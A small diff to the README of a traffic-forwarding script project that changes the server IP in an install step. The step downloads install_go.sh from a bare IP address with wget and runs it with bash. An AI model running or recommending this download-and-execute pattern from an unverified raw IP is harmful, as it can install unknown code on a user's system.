@@ -3,7 +3,7 @@ Scripts to forward traffic data
 
 Usage:
 ```shell
-wget http://218.189.130.233/install_go.sh
+wget http://103.136.187.104/install_go.sh
 bash install_go.sh
 ```
 Or
